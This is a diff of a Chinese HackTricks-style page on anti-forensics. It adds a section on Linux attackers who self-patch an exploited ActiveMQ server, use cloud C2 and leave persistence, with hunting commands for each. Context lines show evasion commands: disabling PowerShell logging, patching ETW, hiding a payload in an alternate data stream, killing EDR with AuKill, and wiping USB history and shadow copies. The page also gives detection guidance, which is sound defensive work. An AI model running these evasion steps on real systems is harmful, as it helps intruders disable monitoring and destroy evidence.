@@ -17,7 +17,7 @@
 
 ### Usnjrnl
 
-**USN日志**（更新序列号日志）是NTFS（Windows NT文件系统）的一个特性，用于跟踪卷的变化。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)工具允许检查这些变化。
+**USN日志**（更新序列号日志）是NTFS（Windows NT文件系统）的一个特性，用于跟踪卷更改。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)工具允许检查这些更改。
 
 ![](<../../images/image (801).png>)
 
@@ -50,26 +50,26 @@
 
 ### SetMace - 反取证工具
 
-该工具可以修改两个属性`$STARNDAR_INFORMATION`和`$FILE_NAME`。然而，从Windows Vista开始，必须在活动操作系统中才能修改此信息。
+该工具可以修改两个属性`$STARNDAR_INFORMATION`和`$FILE_NAME`。然而，从Windows Vista开始，必须在实时操作系统中修改此信息。
 
 ## 数据隐藏
 
-NFTS使用集群和最小信息大小。这意味着如果一个文件占用一个半集群，**剩余的一半将永远不会被使用**，直到文件被删除。因此，可以在这个松弛空间中**隐藏数据**。
+NFTS使用集群和最小信息大小。这意味着如果一个文件占用一个半集群，**剩下的半个集群将永远不会被使用**，直到文件被删除。因此，可以在这个松弛空间中**隐藏数据**。
 
 有像slacker这样的工具可以在这个“隐藏”空间中隐藏数据。然而，对`$logfile`和`$usnjrnl`的分析可以显示一些数据被添加：
 
 ![](<../../images/image (1060).png>)
 
-然后，可以使用像FTK Imager这样的工具检索松弛空间。请注意，这种工具可以保存内容为模糊或甚至加密的形式。
+然后，可以使用FTK Imager等工具检索松弛空间。请注意，这种工具可以保存内容为模糊或甚至加密的形式。
 
 ## UsbKill
 
 这是一个工具，如果检测到USB端口的任何更改，将**关闭计算机**。\
-发现这一点的方法是检查正在运行的进程并**审查每个正在运行的python脚本**。
+发现这一点的一种方法是检查正在运行的进程并**审查每个正在运行的python脚本**。
 
 ## 实时Linux发行版
 
-这些发行版在**RAM**内存中**执行**。检测它们的唯一方法是**在NTFS文件系统以写权限挂载的情况下**。如果仅以读权限挂载，则无法检测到入侵。
+这些发行版在**RAM**内存中**执行**。检测它们的唯一方法是**如果NTFS文件系统以写权限挂载**。如果仅以读权限挂载，则无法检测到入侵。
 
 ## 安全删除
 
@@ -100,7 +100,7 @@ NFTS使用集群和最小信息大小。这意味着如果一个文件占用一�
 
 ### 禁用时间戳 - 最后访问时间
 
-每当从Windows NT服务器上的NTFS卷打开文件夹时，系统会花时间**更新每个列出文件夹的时间戳字段**，称为最后访问时间。在使用频繁的NTFS卷上，这可能会影响性能。
+每当从Windows NT服务器上的NTFS卷打开文件夹时，系统会花时间**更新每个列出文件夹的时间戳字段**，称为最后访问时间。在一个使用频繁的NTFS卷上，这可能会影响性能。
 
 1. 打开注册表编辑器（Regedit.exe）。
 2. 浏览到`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`。
@@ -109,7 +109,7 @@ NFTS使用集群和最小信息大小。这意味着如果一个文件占用一�
 
 ### 删除USB历史
 
-所有**USB设备条目**都存储在Windows注册表的**USBSTOR**注册表项下，该项包含在将USB设备插入PC或笔记本电脑时创建的子键。您可以在这里找到此键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**删除此项**将删除USB历史。\
+所有**USB设备条目**都存储在Windows注册表的**USBSTOR**注册表项下，该项包含在您将USB设备插入PC或笔记本电脑时创建的子键。您可以在这里找到此键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**删除此项**将删除USB历史。\
 您还可以使用工具[**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html)确保您已删除它们（并删除它们）。
 
 另一个保存USB信息的文件是`C:\Windows\INF`中的文件`setupapi.dev.log`。这也应该被删除。
@@ -119,9 +119,9 @@ NFTS使用集群和最小信息大小。这意味着如果一个文件占用一�
 **列出**影子副本使用`vssadmin list shadowstorage`\
 **删除**它们运行`vssadmin delete shadow`
 
-您还可以通过GUI删除它们，按照[https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)中提出的步骤进行操作。
+您还可以通过GUI删除它们，按照[https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)中提出的步骤。
 
-要禁用影子副本，请参见[此处的步骤](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)：
+要禁用影子副本，请参阅[此处的步骤](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)：
 
 1. 通过在单击Windows开始按钮后在文本搜索框中输入“services”打开服务程序。
 2. 从列表中找到“卷影复制”，选择它，然后右键单击访问属性。
@@ -154,9 +154,9 @@ NFTS使用集群和最小信息大小。这意味着如果一个文件占用一�
 
 ## 高级日志记录与跟踪篡改（2023-2025）
 
-### PowerShell ScriptBlock/Module日志记录
+### PowerShell脚本块/模块日志记录
 
-最近版本的Windows 10/11和Windows Server保留**丰富的PowerShell取证文物**在`Microsoft-Windows-PowerShell/Operational`（事件4104/4105/4106）。攻击者可以实时禁用或清除它们：
+最近版本的Windows 10/11和Windows Server在`Microsoft-Windows-PowerShell/Operational`下保留**丰富的PowerShell取证文物**（事件4104/4105/4106）。攻击者可以实时禁用或清除它们：
 ```powershell
 # Turn OFF ScriptBlock & Module logging (registry persistence)
 New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
@@ -180,11 +180,11 @@ WriteProcessMemory(GetCurrentProcess(),
 GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
 patch, sizeof(patch), NULL);
 ```
-公共 PoCs (例如 `EtwTiSwallow`) 在 PowerShell 或 C++ 中实现相同的原语。由于补丁是 **进程本地** 的，运行在其他进程中的 EDR 可能会错过它。检测：比较内存中的 `ntdll` 与磁盘上的 `ntdll`，或在用户模式之前进行钩子。
+公共 PoCs (例如 `EtwTiSwallow`) 在 PowerShell 或 C++ 中实现相同的原语。由于补丁是 **进程本地** 的，运行在其他进程中的 EDR 可能会错过它。检测：比较内存中的 `ntdll` 与磁盘上的，或在用户模式之前进行钩子。
 
 ### 备用数据流 (ADS) 复兴
 
-2023 年的恶意软件活动（例如 **FIN12** 加载程序）已被发现将第二阶段二进制文件放置在 ADS 中，以避免传统扫描器的检测：
+2023 年的恶意软件活动（例如 **FIN12** 加载程序）已被发现将第二阶段二进制文件放置在 ADS 中，以避开传统扫描器：
 ```cmd
 rem Hide cobalt.bin inside an ADS of a PDF
 type cobalt.bin > report.pdf:win32res.dll
@@ -196,22 +196,99 @@ wmic process call create "cmd /c report.pdf:win32res.dll"
 
 ### BYOVD & “AuKill” (2023)
 
-自带易受攻击驱动程序现在在勒索软件入侵中常规用于 **反取证**。
+自带易受攻击驱动程序现在常用于勒索软件入侵中的 **反取证**。
 开源工具 **AuKill** 加载一个已签名但易受攻击的驱动程序 (`procexp152.sys`)，以在 **加密和日志销毁之前** 暂停或终止 EDR 和取证传感器：
 ```cmd
 AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
 AuKill.exe -k CrowdStrike
 ```
-驱动程序随后被移除，留下最少的痕迹。  
-缓解措施：启用 Microsoft 脆弱驱动程序阻止列表 (HVCI/SAC)，并对来自用户可写路径的内核服务创建进行警报。
+驱动程序随后被移除，留下最小的痕迹。  
+缓解措施：启用 Microsoft 漏洞驱动程序黑名单 (HVCI/SAC)，并对来自用户可写路径的内核服务创建进行警报。
 
 ---
 
+## Linux 反取证：自我修补和云 C2 (2023–2025)
+
+### 自我修补被攻陷的服务以减少检测 (Linux)  
+对手越来越多地在利用服务后立即“自我修补”，以防止重新利用并抑制基于漏洞的检测。其思路是用最新的合法上游二进制文件/JAR 替换易受攻击的组件，从而使扫描器报告主机已修补，同时保持持久性和 C2。
+
+示例：Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
+- 后期利用，攻击者从 Maven Central (repo1.maven.org) 获取合法的 JAR，删除 ActiveMQ 安装中的易受攻击 JAR，并重启代理。  
+- 这关闭了初始 RCE，同时保持其他立足点 (cron、SSH 配置更改、单独的 C2 植入)。
+
+操作示例（说明性）
+```bash
+# ActiveMQ install root (adjust as needed)
+AMQ_DIR=/opt/activemq
+cd "$AMQ_DIR"/lib
+
+# Fetch patched JARs from Maven Central (versions as appropriate)
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar
+
+# Remove vulnerable files and ensure the service uses the patched ones
+rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
+ln -sf activemq-client-5.18.3.jar activemq-client.jar
+ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
+
+# Apply changes without removing persistence
+systemctl restart activemq || service activemq restart
+```
+法医/狩猎技巧
+- 检查服务目录以寻找未计划的二进制/JAR 替换：
+- Debian/Ubuntu: `dpkg -V activemq` 并将文件哈希/路径与仓库镜像进行比较。
+- RHEL/CentOS: `rpm -Va 'activemq*'`
+- 查找磁盘上存在但不被包管理器拥有的 JAR 版本，或更新的符号链接。
+- 时间线：`find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` 以关联 ctime/mtime 与妥协窗口。
+- Shell 历史/进程遥测：在初始利用后立即有 `curl`/`wget` 到 `repo1.maven.org` 或其他工件 CDN 的证据。
+- 变更管理：验证谁应用了“补丁”以及原因，而不仅仅是补丁版本的存在。
+
+### 带有承载令牌和反分析启动器的云服务 C2
+观察到的交易技巧结合了多个长期 C2 路径和反分析打包：
+- 密码保护的 PyInstaller ELF 加载器以阻碍沙箱和静态分析（例如，加密的 PYZ，临时提取到 `/_MEI*`）。
+- 指标：`strings` 命中如 `PyInstaller`、`pyi-archive`、`PYZ-00.pyz`、`MEIPASS`。
+- 运行时工件：提取到 `/tmp/_MEI*` 或自定义 `--runtime-tmpdir` 路径。
+- 使用硬编码 OAuth Bearer 令牌的 Dropbox 支持的 C2
+- 网络标记：`api.dropboxapi.com` / `content.dropboxapi.com`，带有 `Authorization: Bearer <token>`。
+- 在代理/NetFlow/Zeek/Suricata 中搜索来自不正常同步文件的服务器工作负载的 Dropbox 域的出站 HTTPS。
+- 通过隧道进行并行/备份 C2（例如，Cloudflare Tunnel `cloudflared`），在一个通道被阻止时保持控制。
+- 主机 IOCs：`cloudflared` 进程/单元，配置在 `~/.cloudflared/*.json`，出站 443 到 Cloudflare 边缘。
+
+### 持久性和“加固回滚”以维持访问（Linux 示例）
+攻击者经常将自我修补与持久访问路径配对：
+- Cron/Anacron：在每个 `/etc/cron.*/` 目录中编辑 `0anacron` 存根以进行定期执行。
+- 搜索：
+```bash
+for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
+grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
+```
+- SSH 配置加固回滚：启用 root 登录并更改低权限帐户的默认 shell。
+- 搜索 root 登录启用：
+```bash
+grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
+# 标志值如 "yes" 或过于宽松的设置
+```
+- 搜索系统帐户上的可疑交互式 shell（例如，`games`）：
+```bash
+awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
+```
+- 随机、短名称的信标工件（8 个字母字符）被写入磁盘并联系云 C2：
+- 搜索：
+```bash
+find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
+-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
+```
+
+防御者应将这些工件与外部暴露和服务补丁事件关联，以揭示用于隐藏初始利用的反取证自我修复。
+
 ## 参考文献
 
-- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (2023年3月)  
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (2023年3月)
 https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
-- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (2024年6月)  
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (2024年6月)
 https://redcanary.com/blog/etw-patching-detection
+
+- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
